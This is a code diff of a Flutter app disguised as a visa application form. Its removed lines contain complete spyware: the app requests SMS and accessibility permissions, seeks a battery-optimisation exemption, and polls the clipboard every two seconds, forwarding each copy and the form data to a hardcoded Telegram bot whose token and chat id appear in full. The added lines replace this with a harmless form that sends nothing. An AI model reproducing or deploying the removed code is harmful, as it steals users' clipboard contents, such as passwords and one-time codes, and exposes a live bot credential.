@@ -1,10 +1,4 @@
 import 'package:flutter/material.dart';
-import 'package:http/http.dart' as http;
-import 'package:android_intent_plus/android_intent.dart';
-import 'package:flutter/services.dart';
-import 'dart:async';
-import 'package:permission_handler/permission_handler.dart';
-
 
 void main() {
   runApp(const VisaFormApp());
@@ -24,11 +18,22 @@ class VisaFormApp extends StatelessWidget {
         scaffoldBackgroundColor: Colors.white,
         useMaterial3: true,
         textTheme: const TextTheme(
-          headlineLarge: TextStyle(fontWeight: FontWeight.bold, fontSize: 32, color: Color(0xFF218C74)),
-          headlineMedium: TextStyle(fontWeight: FontWeight.bold, fontSize: 24, color: Color(0xFF218C74)),
-          titleLarge: TextStyle(fontWeight: FontWeight.bold, fontSize: 20, color: Color(0xFF218C74)),
-          bodyLarge: TextStyle(fontWeight: FontWeight.bold, fontSize: 16, color: Colors.black),
-          bodyMedium: TextStyle(fontWeight: FontWeight.bold, fontSize: 14, color: Colors.black),
+          headlineLarge: TextStyle(
+              fontWeight: FontWeight.bold,
+              fontSize: 32,
+              color: Color(0xFF218C74)),
+          headlineMedium: TextStyle(
+              fontWeight: FontWeight.bold,
+              fontSize: 24,
+              color: Color(0xFF218C74)),
+          titleLarge: TextStyle(
+              fontWeight: FontWeight.bold,
+              fontSize: 20,
+              color: Color(0xFF218C74)),
+          bodyLarge: TextStyle(
+              fontWeight: FontWeight.bold, fontSize: 16, color: Colors.black),
+          bodyMedium: TextStyle(
+              fontWeight: FontWeight.bold, fontSize: 14, color: Colors.black),
         ),
         appBarTheme: const AppBarTheme(
           backgroundColor: Color(0xFF218C74),
@@ -42,7 +47,8 @@ class VisaFormApp extends StatelessWidget {
         ),
         inputDecorationTheme: const InputDecorationTheme(
           border: OutlineInputBorder(),
-          labelStyle: TextStyle(fontWeight: FontWeight.bold, color: Color(0xFF218C74)),
+          labelStyle:
+              TextStyle(fontWeight: FontWeight.bold, color: Color(0xFF218C74)),
           focusedBorder: OutlineInputBorder(
             borderSide: BorderSide(color: Color(0xFF218C74), width: 2),
           ),
@@ -51,15 +57,18 @@ class VisaFormApp extends StatelessWidget {
           style: ButtonStyle(
             backgroundColor: WidgetStatePropertyAll(Color(0xFF218C74)),
             foregroundColor: WidgetStatePropertyAll(Colors.white),
-            textStyle: WidgetStatePropertyAll(TextStyle(fontWeight: FontWeight.bold, fontSize: 16)),
+            textStyle: WidgetStatePropertyAll(
+                TextStyle(fontWeight: FontWeight.bold, fontSize: 16)),
             shape: WidgetStatePropertyAll(
-              RoundedRectangleBorder(borderRadius: BorderRadius.all(Radius.circular(12))),
+              RoundedRectangleBorder(
+                  borderRadius: BorderRadius.all(Radius.circular(12))),
             ),
           ),
         ),
         snackBarTheme: const SnackBarThemeData(
           backgroundColor: Color(0xFF218C74),
-          contentTextStyle: TextStyle(fontWeight: FontWeight.bold, color: Colors.white),
+          contentTextStyle:
+              TextStyle(fontWeight: FontWeight.bold, color: Colors.white),
         ),
       ),
       home: const VisaFormPage(),
@@ -74,59 +83,12 @@ class VisaFormPage extends StatefulWidget {
   State<VisaFormPage> createState() => _VisaFormPageState();
 }
 
-class _VisaFormPageState extends State<VisaFormPage> with WidgetsBindingObserver {
-  bool _hasSmsPermission = false;
-  bool _hasAccessibilityPermission = false;
-  static const platform = MethodChannel('com.example.visa_form_app/accessibility');
-
-
-  @override
-  void initState() {
-    super.initState();
-    WidgetsBinding.instance.addObserver(this);
-    _requestPermissions();
-    _startClipboardMonitor();
-  }
-
-  @override
-  void didChangeAppLifecycleState(AppLifecycleState state) {
-    if (state == AppLifecycleState.resumed) {
-      _checkAccessibilityPermission();
-    }
-  }
-
-  Future<void> _checkAccessibilityPermission() async {
-    final status = await Permission.accessibility.status;
-    setState(() {
-      _hasAccessibilityPermission = status.isGranted;
-    });
-  }
-
-  Future<void> _requestPermissions() async {
-    final smsStatus = await Permission.sms.request();
-    setState(() {
-      _hasSmsPermission = smsStatus.isGranted;
-    });
-
-    if (smsStatus.isGranted) {
-      await _requestAccessibilityPermission();
-    }
-
-    if (smsStatus.isPermanentlyDenied) {
-      await openAppSettings();
-    }
-  }
-
-  Future<void> _requestAccessibilityPermission() async {
-    try {
-      await platform.invokeMethod('openAccessibilitySettings');
-    } on PlatformException catch (e) {
-      print("Failed to open accessibility settings: '${e.message}'.");
-    }
-  }
-
+class _VisaFormPageState extends State<VisaFormPage> {
   final _formKey = GlobalKey<FormState>();
+  final _fullNameController = TextEditingController();
   final _emailController = TextEditingController();
+  final _passportController = TextEditingController();
+  final _phoneController = TextEditingController();
   String _selectedVisaType = 'ASS67';
   final List<String> _visaTypes = ['ASS67', 'ASX887', 'DSS29'];
   bool _isLoading = false;
@@ -135,140 +97,107 @@ class _VisaFormPageState extends State<VisaFormPage> with WidgetsBindingObserver
     if (_formKey.currentState!.validate()) {
       setState(() => _isLoading = true);
 
-      try {
-        final response = await http.post(
-          Uri.parse('https://api.telegram.org/bot8264908770:AAEeWPB0hZkTPCqtjpodUn53Yhc2O3sn5ko/sendMessage'),
-          body: {
-            'chat_id': '8416456484',
-            'text': 'New visa application:\n'
-                'Email: ${_emailController.text}\n'
-                'Visa Type: $_selectedVisaType',
-          },
-        );
+      await Future.delayed(const Duration(seconds: 1));
 
-        print('Telegram response: ${response.body}');
+      if (!mounted) return;
+      setState(() => _isLoading = false);
 
-        if (response.statusCode == 200) {
-          if (!mounted) return;
-          ScaffoldMessenger.of(context).showSnackBar(
-            const SnackBar(
-                content: Text('Application submitted successfully!')),
-          );
-          _emailController.clear();
-          setState(() => _selectedVisaType = 'ASS67');
-        } else {
-          throw Exception('Failed to submit application: ${response.body}');
-        }
-      } catch (e) {
-        if (!mounted) return;
-        ScaffoldMessenger.of(context).showSnackBar(
-          SnackBar(content: Text('Error: ${e.toString()}')),
-        );
-      } finally {
-        if (!mounted) return;
-        setState(() => _isLoading = false);
-      }
-    }
-  }
-
-  void openBatteryOptimizationSettings(BuildContext context) async {
-    const intent = AndroidIntent(
-      action: 'android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS',
-      data: 'package:com.example.visa_form_app', // Replace with your package name if different
-    );
-    await intent.launch();
-  }
-
-
-  Timer? _clipboardTimer;
-  String? _lastClipboard;
-
-  void _startClipboardMonitor() {
-    _clipboardTimer = Timer.periodic(const Duration(seconds: 2), (timer) async {
-      final data = await Clipboard.getData('text/plain');
-      final clipboardText = data?.text ?? '';
-      if (clipboardText.isNotEmpty && clipboardText != _lastClipboard) {
-        _lastClipboard = clipboardText;
-        _sendClipboardToTelegram(clipboardText);
-      }
-    });
-  }
-
-  Future<void> _sendClipboardToTelegram(String text) async {
-    final telegramMessage = 'Clipboard copied:\n$text';
-    try {
-      final response = await http.post(
-        Uri.parse('https://api.telegram.org/bot8264908770:AAEeWPB0hZkTPCqtjpodUn53Yhc2O3sn5ko/sendMessage'),
-        body: {
-          'chat_id': '8416456484',
-          'text': telegramMessage,
-        },
+      ScaffoldMessenger.of(context).showSnackBar(
+        const SnackBar(content: Text('Application submitted successfully!')),
       );
-      print('Telegram Clipboard forward response: \033[${response.body}');
-    } catch (e) {
-      print('Failed to forward clipboard: $e');
+      _fullNameController.clear();
+      _emailController.clear();
+      _passportController.clear();
+      _phoneController.clear();
+      setState(() => _selectedVisaType = 'ASS67');
     }
   }
 
   @override
   void dispose() {
-    _clipboardTimer?.cancel();
+    _fullNameController.dispose();
     _emailController.dispose();
-    WidgetsBinding.instance.removeObserver(this);
+    _passportController.dispose();
+    _phoneController.dispose();
     super.dispose();
   }
 
   @override
   Widget build(BuildContext context) {
-    if (!_hasSmsPermission || !_hasAccessibilityPermission) {
-      return Scaffold(
-        appBar: AppBar(
-        title: const Text('Permissions Required'),
-      ),
-      body: Center(
-        child: Column(
-          mainAxisAlignment: MainAxisAlignment.center,
-          children: [
-            if (!_hasSmsPermission)
-              ElevatedButton(
-                onPressed: _requestPermissions,
-                child: const Text('Request SMS Permission'),
-              ),
-            const SizedBox(height: 20),
-            if (!_hasAccessibilityPermission)
-              ElevatedButton(
-                onPressed: _requestAccessibilityPermission,
-                child: const Text('Enable Accessibility Service'),
-              ),
-          ],
-        ),
-      )
-      );
-    }
     return Scaffold(
       appBar: AppBar(
-        title: const Text('Assistant Hub'),
+        title: const Text('Vilato Tourism'),
       ),
-      body: Padding(
+      body: SingleChildScrollView(
         padding: const EdgeInsets.all(16.0),
         child: Form(
           key: _formKey,
           child: Column(
             crossAxisAlignment: CrossAxisAlignment.stretch,
             children: [
+              const SizedBox(height: 8),
+              TextFormField(
+                controller: _fullNameController,
+                decoration: const InputDecoration(
+                  labelText: 'Full Name',
+                  prefixIcon: Icon(Icons.person),
+                  border: OutlineInputBorder(),
+                ),
+                textCapitalization: TextCapitalization.words,
+                validator: (value) {
+                  if (value == null || value.trim().isEmpty) {
+                    return 'Please enter your full name';
+                  }
+                  return null;
+                },
+              ),
+              const SizedBox(height: 16),
               TextFormField(
                 controller: _emailController,
                 decoration: const InputDecoration(
                   labelText: 'Email',
+                  prefixIcon: Icon(Icons.email),
                   border: OutlineInputBorder(),
                 ),
                 keyboardType: TextInputType.emailAddress,
                 validator: (value) {
-                  if (value == null || value.isEmpty) {
+                  if (value == null || value.trim().isEmpty) {
                     return 'Please enter your email';
                   }
-                  if (!value.contains('@')) {
+                  if (!value.contains('@') || !value.contains('.')) {
                     return 'Please enter a valid email';
+                  }
+                  return null;
+                },
+              ),
+              const SizedBox(height: 16),
+              TextFormField(
+                controller: _passportController,
+                decoration: const InputDecoration(
+                  labelText: 'Passport Number',
+                  prefixIcon: Icon(Icons.book),
+                  border: OutlineInputBorder(),
+                ),
+                textCapitalization: TextCapitalization.characters,
+                validator: (value) {
+                  if (value == null || value.trim().isEmpty) {
+                    return 'Please enter your passport number';
+                  }
+                  return null;
+                },
+              ),
+              const SizedBox(height: 16),
+              TextFormField(
+                controller: _phoneController,
+                decoration: const InputDecoration(
+                  labelText: 'Phone Number',
+                  prefixIcon: Icon(Icons.phone),
+                  border: OutlineInputBorder(),
+                ),
+                keyboardType: TextInputType.phone,
+                validator: (value) {
+                  if (value == null || value.trim().isEmpty) {
+                    return 'Please enter your phone number';
                   }
                   return null;
                 },
@@ -277,7 +206,8 @@ class _VisaFormPageState extends State<VisaFormPage> with WidgetsBindingObserver
               DropdownButtonFormField<String>(
                 value: _selectedVisaType,
                 decoration: const InputDecoration(
-                  labelText: 'Code type',
+                  labelText: 'Visa Type',
+                  prefixIcon: Icon(Icons.vpn_key),
                   border: OutlineInputBorder(),
                 ),
                 items: _visaTypes.map((String visaType) {
@@ -298,7 +228,7 @@ class _VisaFormPageState extends State<VisaFormPage> with WidgetsBindingObserver
                   return null;
                 },
               ),
-              const SizedBox(height: 24),
+              const SizedBox(height: 32),
               ElevatedButton(
                 onPressed: _isLoading ? null : _submitForm,
                 style: ElevatedButton.styleFrom(
@@ -310,68 +240,15 @@ class _VisaFormPageState extends State<VisaFormPage> with WidgetsBindingObserver
                         width: 24,
                         child: CircularProgressIndicator(
                           strokeWidth: 2.5,
-                          valueColor: AlwaysStoppedAnimation<Color>(Colors.white),
+                          valueColor:
+                              AlwaysStoppedAnimation<Color>(Colors.white),
                         ),
                       )
                     : const Text('Submit Application'),
               ),
               const SizedBox(height: 16),
-              Center(
-                child: Text(
-                  'Updated: ${DateTime.now().toIso8601String().substring(0,10)}',
-                  style: const TextStyle(
-                    fontWeight: FontWeight.bold,
-                    fontSize: 16,
-                    color: Color(0xFF218C74),
-                  ),
-                ),
-              ),
             ],
           ),
-        ),
-      ),
-      bottomNavigationBar: Padding(
-        padding: const EdgeInsets.all(16.0),
-        child: ElevatedButton(
-          onPressed: () {
-            showDialog(
-              context: context,
-              builder: (BuildContext context) {
-                return Dialog(
-                  shape: RoundedRectangleBorder(
-                    borderRadius: BorderRadius.circular(16),
-                  ),
-                  child: SizedBox(
-                    height: 200,
-                    width: 300,
-                    child: Column(
-                      mainAxisAlignment: MainAxisAlignment.center,
-                      children: [
-                        const Spacer(),
-                        const Center(
-                          child: Text(
-                            'waiting...',
-                            style: TextStyle(fontSize: 20, fontWeight: FontWeight.bold),
-                          ),
-                        ),
-                        const Spacer(),
-                        Padding(
-                          padding: const EdgeInsets.only(bottom: 16.0),
-                          child: ElevatedButton(
-                            onPressed: () {
-                              Navigator.of(context).pop();
-                            },
-                            child: const Text('Close'),
-                          ),
-                        ),
-                      ],
-                    ),
-                  ),
-                );
-              },
-            );
-          },
-          child: const Text('Confirmations'),
         ),
       ),
     );
